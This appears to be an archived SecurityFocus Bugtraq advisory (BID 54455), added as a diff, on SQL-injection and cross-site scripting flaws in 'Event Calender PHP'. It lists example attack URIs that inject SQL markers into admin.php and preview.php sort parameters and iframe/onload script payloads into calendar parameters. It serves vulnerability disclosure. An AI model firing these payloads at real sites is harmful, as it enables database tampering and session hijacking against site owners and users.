@@ -1,0 +1,93 @@
+#SpeeDr00t@Black Falcon<br>#bid54455<p><b><span style="font-size: 18pt;">Event Calender PHP Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/54455/info">info</a><br><a href="http://www.securityfocus.com/bid/54455/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/54455/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/54455/solution">solution</a><br><a href="http://www.securityfocus.com/bid/54455/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				54455
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 16 2012 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 19 2015 09:43AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				snup
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit the SQL-injection issue. The attacker must trick an unsuspecting victim into following a malicious URI to exploit the cross-site scripting issue.           <br/> <br/>The following example URIs are available:           <br/> <br/>http://www.example.com/eventcalendar/admin.php?act=calendars&amp;amp;orderType=DESC&amp;amp;search=&amp;amp;orderBy=-1%27SQL-INJECTIONcal_name&amp;amp;cal_id=2<br/><br/>http://www.example.com/eventcalendar/admin.php?act=calendars&amp;amp;orderType=-1%27SQL-INJECTION&amp;amp;search=&amp;amp;orderBy=cal_name&amp;amp;cal_id=2<br/><br/>http://www.example.com/eventcalendar/admin.php?act=events&amp;amp;orderType=ASC-1%27SQL-INJECTION&amp;amp;orderBy=event_title&amp;amp;cal_id=2<br/><br/>http://www.example.com/eventcalendar/admin.php?act=events&amp;amp;orderType=ASC&amp;amp;orderBy=-1%27SQL-INJECTIONevent_title&amp;amp;cal_id=2<br/><br/>http://www.example.com/preview.php?act=calendars&amp;amp;orderType=DESC&amp;amp;search=&amp;amp;orderBy=-1%27SQL-INJECTIONcal_name&amp;amp;cal_id=2 <br/> <br/>http://www.example.com/eventcalendar/admin.php?act=newCal&amp;amp;cal_id=2<br/><br/>http://www.example.com/eventcalendar/admin.php?act=newEvent&amp;amp;cal_id=2 <br/> <br/>http://www.example.com/eventcalendar/preview.php?cal_id=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C&amp;amp;cal_month=1&amp;amp;cal_year=0#oncal<br/><br/>http://www.example.com/eventcalendar/preview.php?cal_id=2&amp;amp;cal_month=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C&amp;amp;cal_year=0#oncal<br/><br/>http://www.example.com/eventcalendar/preview.php?cal_id=2&amp;amp;cal_month=1&amp;amp;cal_year=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C#oncal<br/><br/>http://www.example.com/eventcalendar/admin.php?act=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C
+	
+		<ul>
+</ul>
+</div>
